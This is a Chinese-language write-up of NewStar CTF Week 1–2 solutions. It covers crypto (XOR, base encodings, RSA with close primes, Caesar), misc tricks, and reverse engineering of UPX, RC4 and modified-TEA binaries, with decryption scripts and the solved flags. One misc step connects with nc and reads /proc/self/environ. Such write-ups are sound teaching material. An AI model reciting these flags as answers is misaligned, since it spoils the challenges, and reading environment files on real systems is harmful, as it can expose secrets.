<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line">key2 = bytes_to_long(key)</span><br><span class="line">c1 = <span class="number">8091799978721254458294926060841</span></span><br><span class="line">c2 = <span class="string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line">c2 = bytes_to_long(c2) <span class="comment"># 18329866411473355926313989435</span></span><br><span class="line">c1_xor = c1 ^ key2</span><br><span class="line">c1_bytes = long_to_bytes(c1_xor)</span><br><span class="line">c1_str = c1_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">c2_xor = c2 ^ key2</span><br><span class="line">c2_bytes = long_to_bytes(c2_xor)</span><br><span class="line">c2_str = c2_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">flag = c1_str + c2_str</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h3><p>将<code>4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D</code>扔进cyberchef，经过16进制+base32+base64转换为<font color=deepskyblue><strong>flag{B@sE_0f_CrYpt0_N0W}</strong></font>.</p>
<h3 id="一眼秒了："><a href="#一眼秒了：" class="headerlink" title="一眼秒了："></a>一眼秒了：</h3><p>观察所给py文件发现是RSA加密算法，给了两个308位的整数，测试getprime(512)函数发现生成的是154-155位的质数，这样得到的n可以是308位的整数，将第一个数(n)因数分解（分解网站<code>https://factordb.com/</code>）得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><span class="line">q=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span><br></pre></td></tr></table></figure>
<p>计算φ(n) &#x3D; (p-1)*(q-1)： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phin=52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674858130758088899044472900099582762041084679725101595564288259840921657497158600332295551583526683560422708098048258479197276963841017255615653572783474986640</span><br></pre></td></tr></table></figure>
<p>私钥d 使用 gmpy2.invert(e,φ(n))求解得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span><br></pre></td></tr></table></figure>
<p>结合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br></pre></td></tr></table></figure>
<p>而m &#x3D; pow(c, d, n)，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span><br></pre></td></tr></table></figure>
<p>把m从long转化为bytes得到b’<font color=deepskyblue><strong>flag{9cd4b35a-affc-422a-9862-58e1cc3ff8d2}</strong></font>‘，即包含flag.<br>Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;φ =&#x27;</span>,phin)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">d = <span class="number">50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span></span><br><span class="line">c = <span class="number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m =&#x27;</span>,m)</span><br><span class="line">m = <span class="number">56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span></span><br><span class="line">m2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>,m2)</span><br><span class="line">m3 = m2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m3 =&#x27;</span>, m3)</span><br></pre></td></tr></table></figure>

<h3 id="Strange-King："><a href="#Strange-King：" class="headerlink" title="Strange King："></a>Strange King：</h3><p>观察发现<font color=red><strong>ksjr{EcxvpdErSvcDgdgEzxqjql}</strong></font>的前四位是偏移量分别为5,7,9,11的凯撒加密，以此类推得到初步结果<font color=red><strong>flag{RngcugFqPqvUvqrNgctkpi}</strong></font>，被包裹部分再进行偏移量为2的凯撒解密得到<font color=deepskyblue><strong>flag{PleaseDoNotStopLearing}</strong></font>.</p>
<h2 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="WhereIsFlag："><a href="#WhereIsFlag：" class="headerlink" title="WhereIsFlag："></a>WhereIsFlag：</h3><p>下载vmware和linux Ubuntu并安装虚拟机，在指令行里面nc指令进入所给地址，经过测试用ls指令在proc&#x2F;self里找到三个文件，其中environ用cat指令查看得到<font color=deepskyblue><strong>flag{a3aacfc0-a14c-4331-9cc1-0f70dc678d4b}</strong></font>.</p>
<h3 id="Labyrinth："><a href="#Labyrinth：" class="headerlink" title="Labyrinth："></a>Labyrinth：</h3><p>查看图片的LSB（<code>lsb.daidr.me</code>），在<code>RGB plane 0</code>模式下得到一张二维码，扫描得到<font color=deepskyblue><strong>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</strong></font>.</p>
<h3 id="decompress："><a href="#decompress：" class="headerlink" title="decompress："></a>decompress：</h3><p>将16个zip压缩分卷合并解压得到<font color=deepskyblue><strong>flag{e6468aaf-7ddc-4eb2-b6db-bce9f1ffb52f_oOo0hhh_U_r3411y_K0nw_h0w_2_d3c0mpr355_Multi-part_archive_5e35fcde-28e1-487d-9659-ba2dab629bb3_&amp;_Th1s_f1ag_15_s0O0oO_l0oOoOng999_b433dc9b-db28-4a1d-965b-dc0a95d3a53a}</strong></font>，整体32位小写MD5加密得到<font color=lime><strong>c6edaba55bac51875a215e2de11c35dd</strong></font>，即为flag.</p>
<h3 id="pleasingMusic："><a href="#pleasingMusic：" class="headerlink" title="pleasingMusic："></a>pleasingMusic：</h3><p>将音乐文件中出现的摩斯电码倒置解读得到<font color=red><strong>EZ_MORSE_CODE</strong></font>，即为flag.</p>
<h3 id="兑换码："><a href="#兑换码：" class="headerlink" title="兑换码："></a>兑换码：</h3><p>用winhex修改图片高度，在下方发现<font color=deepskyblue><strong>flag{La_vaguelette}</strong></font>.</p>
<h1 id="赛题轮次：Week2"><a href="#赛题轮次：Week2" class="headerlink" title="赛题轮次：Week2"></a>赛题轮次：Week2</h1><h2 id="已解出的题目：-1"><a href="#已解出的题目：-1" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Reverse</td>
<td align="center">UPX、drink_TEA、Ptrace、ezencrypt、PangBai 泰拉记（1）、Dirty flowers</td>
</tr>
<tr>
<td align="center">Web</td>
<td align="center">你能在一秒内打出八句英文吗</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">这是几次方？疑惑！、Since you konw something、<br>茶里茶气、Just one and more than two</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">wireshark_checkin、wireshark_secret、热心助人的小明同学、<br>用溯流仪见证伏特台风、你也玩原神吗、字里行间的秘密、Herta’s Study</td>
</tr>
</tbody></table>
<h2 id="Reverse方向：-1"><a href="#Reverse方向：-1" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="UPX："><a href="#UPX：" class="headerlink" title="UPX："></a>UPX：</h3><p>用exeinfope查看发现加了upx壳，用UPX程序对原文件进行脱壳，用IDA反编译得到main主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%22s&quot;</span>, s);</span><br><span class="line">  RC4(s, key);</span><br><span class="line">  <span class="keyword">for</span> ( status = <span class="number">0</span>; status &lt;= <span class="number">21</span>; ++status )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[status] != data[status] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;this is Wrong~&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(status);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;this is right~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现是RC4算法，通过IDA反编译找到key为<font color=red><strong>NewStar</strong></font>，在Linux Ubuntu上进行动态调试，打断点后得到data内储存的数据为：<font color=lime><strong>{0xC4, 0x60, 0xAF, 0xB9, 0xE3, 0xFF, 0x2E, 0x9B, 0xF5, 0x10, 0x56, 0x51, 0x6E, 0xEE, 0x5F, 0x7D, 0x7D, 0x6E, 0x2B, 0x9C, 0x75, 0xB5}</strong></font>，询问AI得到RC4解密代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// RC4算法的实现</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">int</span> data_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, t;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>], K[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="comment">// 初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        K[i] = key[i % <span class="built_in">strlen</span>((<span class="type">char</span> *)key)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 打乱S盒</span></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + S[i] + K[i]) % <span class="number">256</span>;</span><br><span class="line">        temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成密钥流并加密/解密数据</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; data_len; t++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">        temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">        data[t] ^= S[(S[i] + S[j]) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[] = &#123;<span class="number">0xC4</span>, <span class="number">0x60</span>, <span class="number">0xAF</span>, <span class="number">0xB9</span>, <span class="number">0xE3</span>, <span class="number">0xFF</span>, <span class="number">0x2E</span>, <span class="number">0x9B</span>, <span class="number">0xF5</span>, <span class="number">0x10</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x6E</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x7D</span>, <span class="number">0x7D</span>, <span class="number">0x6E</span>, <span class="number">0x2B</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xB5</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用RC4算法对data进行解密</span></span><br><span class="line">    RC4(data, key, <span class="number">22</span>);</span><br><span class="line">    <span class="comment">// 输出解密后的flag</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The correct flag is: %s\n&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解出flag为：<font color=deepskyblue><strong>flag{Do_you_know_UPX?}</strong></font>.</p>
<h3 id="drink-TEA："><a href="#drink-TEA：" class="headerlink" title="drink_TEA："></a>drink_TEA：</h3><p>反编译观察主函数，发现首先是长度检测，要求输入的flag应当是32位（20h），然后将输入的字符每8字节执行一次以key &#x3D; ‘WelcomeToNewStar’的魔改TEA加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword\_7FF6E5E74078; i += <span class="number">8</span> )</span><br><span class="line">  sub\_7FF6E5E71180((<span class="type">unsigned</span> <span class="type">int</span> \*)&amp;Buf1[i], aWelcometonewst); <span class="comment">//aWelcomeNewSt即为key</span></span><br></pre></td></tr></table></figure>
<p>经过转换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">key = <span class="string">&quot;WelcomeToNewStar&quot;</span></span><br><span class="line">key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key_ints = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key_bytes)</span><br><span class="line"><span class="built_in">print</span>(key_ints)</span><br></pre></td></tr></table></figure>
<p>得到<font color=lime><strong>key &#x3D; [0x636C6557, 0x54656D6F, 0x77654E6F, 0x72617453]，动态调试找到加密后的32字节为：[0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0x0C, 0xE, 0xDA, 0x85, 0x59, 0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59, 0x29, 0x02, 0x0D, 0xED, 0x07, 0xA8, 0xB9, 0xEE, 0x36, 0x59, 0x11, 0x87, 0xFD, 0x5C, 0x23, 0x24]</strong></font>，那么按8字节进行合并得到<font color=lime><strong>[0x7820F7B3C542CEDA, 0x8559211A26565A59, 0x29020DED07A8B9EE, 0x36591187FD5C2324]</strong></font>，接下来观察被魔改的TEA加密部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF6E5E71180</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 -= <span class="number">1640531527</span>;</span><br><span class="line">    v3 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">    v4 += (a2[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  result = <span class="number">4</span>i64;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于TEA要把原数据拆分成两个部分，所以实际上每次大循环产生的v3和v4是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x7820F7B3</span>	<span class="number">0xC542CEDA</span></span><br><span class="line"><span class="number">0x8559211A</span>	<span class="number">0x26565A59</span></span><br><span class="line"><span class="number">0x29020DED</span>	<span class="number">0x07A8B9EE</span></span><br><span class="line"><span class="number">0x36591187</span>	<span class="number">0xFD5C2324</span></span><br></pre></td></tr></table></figure>
<p>并且这里的v5也与标准的TEA不同，是从<code>-1640531527</code>开始，每次逐步减小直到<code>-32*1640531527</code>的，基于此构建逆向函数后却发现不论是正向加密还是逆向解密，v3、v4的位数都会逐渐扩大，再次进行动态调试，代入测试值进行检查，发现key（a2）的值居然是变动的，并且v3、v4也一直维持八位数，再次详细观察推断后发现v3、v4、v5等均为32位整型，在计算过程中因为超出了32位上限而全部被 &amp; 0xFFFFFFFF，而a2的值的变动并不影响v3、v4在不变情况下的计算值（也就是说相当于没有变动），所以真正的加密函数是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v5 = (v5 - <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v3 = (v3 + ((a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4) ^ (a2[<span class="number">0</span>] + <span class="number">16</span> * v4))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v4 = (v4 + ((a2[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3))) &amp; <span class="number">0xFFFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>基于此编写逆向代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a2 = [<span class="number">0x636C6557</span>, <span class="number">0x54656D6F</span>, <span class="number">0x77654E6F</span>, <span class="number">0x72617453</span>]</span><br><span class="line">v3 = [<span class="number">0x7820F7B3</span>, <span class="number">0x8559211A</span>, <span class="number">0x29020DED</span>, <span class="number">0x36591187</span>]</span><br><span class="line">v4 = [<span class="number">0xC542CEDA</span>, <span class="number">0x26565A59</span>, <span class="number">0x07A8B9EE</span>, <span class="number">0xFD5C2324</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  v5 = (-<span class="number">32</span> * <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v4[i] = (v4[i] - ((a2[<span class="number">3</span>] + (v3[i] &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3[i]) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v3[i] = (v3[i] - ((a2[<span class="number">1</span>] + (v4[i] &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4[i]) ^ (a2[<span class="number">0</span>] + <span class="number">16</span> * v4[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v5 = (v5 + <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;%#x&#x27;</span> % v3[i], <span class="string">&#x27;%#x&#x27;</span> % v4[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x375bac75</span>	<span class="number">0x6426e101</span></span><br><span class="line"><span class="number">0x28af0d64</span>	<span class="number">0x59ed8260</span></span><br><span class="line"><span class="number">0x04aa71d2</span>	<span class="number">0x5e2afbfb</span></span><br><span class="line"><span class="number">0xcc99e4b9</span>	<span class="number">0x1f63f6e9</span></span><br></pre></td></tr></table></figure>
<p>但是并无法转换成可读字符，再观察寄存器RCX后发现四个字节是倒着填进去的（也就是说假设对计算结果37 5B AC 75，实际填入的是75 AC 5B 37，这叫做小端序），所以与原式不同，我们将原式每四个字节按小端序填入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">0xB3F72078</span>, <span class="number">0x1A215985</span>, <span class="number">0xED0D0229</span>, <span class="number">0x87115936</span>]</span><br><span class="line">v4 = [<span class="number">0xDACE42C5</span>, <span class="number">0x595A5626</span>, <span class="number">0xEEB9A807</span>, <span class="number">0x24235CFD</span>]</span><br></pre></td></tr></table></figure>
<p>再次带入逆向脚本，得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x67616c66</span>	<span class="number">0x6568547b</span></span><br><span class="line"><span class="number">0x525f6572</span>	<span class="number">0x4145545f</span></span><br><span class="line"><span class="number">0x4554585f</span>	<span class="number">0x6e615f41</span></span><br><span class="line"><span class="number">0x58585f64</span>	<span class="number">0x7d414554</span></span><br></pre></td></tr></table></figure>
<p>十六进制转字符串得到：<font color=deepskyblue><strong>galfehT{R_erAET_ETX_na_AXX_d}AET</strong></font>，观察发现也是四个字节倒填，翻转得到：<font color=deepskyblue><strong>flag{There_R_TEA_XTEA_and_XXTEA}</strong></font>.</p>
<h3 id="Ptrace："><a href="#Ptrace：" class="headerlink" title="Ptrace："></a>Ptrace：</h3><p>发现有两个文件father和son，反编译观察得知父程序检测输入的32个字符并创建子进程（也就是子程序），在子进程中完成检验，父程序会在<font color=red><strong>ptrace(PTRACE_POKEDATA, addr, addr, 3)</strong></font>中将子程序的<font color=red><strong>dword_60004040</strong></font>从其初始化设置的4改为3，子程序以<code>start</code>函数为起始，以<font color=red><strong>sub_600011AD</strong></font>作为main函数，函数中的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  byte_60004080[i] = ((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="number">8</span> - dword_60004040));</span><br></pre></td></tr></table></figure>
